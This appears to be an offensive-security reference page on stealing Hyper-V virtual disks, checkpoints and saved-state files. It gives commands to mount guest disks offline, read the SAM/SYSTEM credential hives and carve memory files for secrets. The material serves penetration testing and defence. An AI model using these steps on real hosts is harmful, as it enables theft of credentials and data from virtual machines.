---
title: "Checkpoint and VHD theft: taking Hyper-V virtual disks and saved state"
description: "Hyper-V stores VM disks as VHD/VHDX files and checkpoints as differencing disks plus saved-state and memory files. With host or share access, an attacker copies these and reads the guest filesystems offline, extracting credentials and data without entering the VM, and reads saved-state memory for live secrets captured at checkpoint time."
keywords:
  - vhd
  - vhdx
  - checkpoint
  - saved state
  - offline access
---

# Checkpoint and VHD theft

Hyper-V keeps each VM's disks as VHD or VHDX files and its checkpoints as differencing disks (`.avhdx`) alongside configuration and saved-state files. Access to those files, on the host, an SMB library share, or a backup, lets an attacker read the guest filesystems offline and extract everything in them without touching the running VM: no login, no in-guest defenses. Saved-state and memory files from a checkpoint additionally capture live memory, so secrets present when the checkpoint was taken are recoverable.

## Locate and mount the disks

```powershell
# find VM disks and checkpoints
Get-VM | Get-VMHardDiskDrive | Select VMName, Path
Get-VMSnapshot -VMName <vm>                        # checkpoints -> .avhdx differencing disks
# default locations
dir 'C:\ProgramData\Microsoft\Windows\Hyper-V\'
dir 'C:\Users\Public\Documents\Hyper-V\Virtual hard disks\'
# mount a VHDX read-only to read the guest filesystem offline
Mount-VHD -Path '<vm>.vhdx' -ReadOnly
# then read the mounted volume: SAM/SYSTEM hives, files, keys
```

```bash
# offline on another host with libguestfs
guestmount -a disk.vhdx -i --ro /mnt/guest
reg="/mnt/guest/Windows/System32/config"; ls "$reg"/SAM "$reg"/SYSTEM
```

## Saved state and memory

```powershell
# saved-state (.vsv) and memory (.bin / .vmrs) files hold live memory at save time
# carve them for in-memory secrets (keys, tokens, cached credentials)
dir '<vm path>\*.VMRS','<vm path>\*.bin'
```

## Exploitation notes

- Mounting a VHDX read-only (or `guestmount` offline) bypasses all in-guest controls; prioritise the Windows SAM/SYSTEM hives for offline hash extraction and any stored keys.
- Differencing checkpoint disks (`.avhdx`) must be chained to the parent for a complete filesystem view; mount the full chain, or merge, to read the current state.
- Saved-state and memory files are the equivalent of a memory image at checkpoint time and contain secrets that were decrypted in RAM; carve them with a memory-forensics tool.
- File access is the whole precondition: a readable Hyper-V storage share or backup is guest-data theft for every VM on it, no host execution required.

## Tools

- [libguestfs / guestmount](https://libguestfs.org/)

## References

- [Microsoft: VHDX format and checkpoints](https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/)
- [Microsoft: manage Hyper-V checkpoints](https://learn.microsoft.com/en-us/windows-server/virtualization/hyper-v/manage/checkpoints)
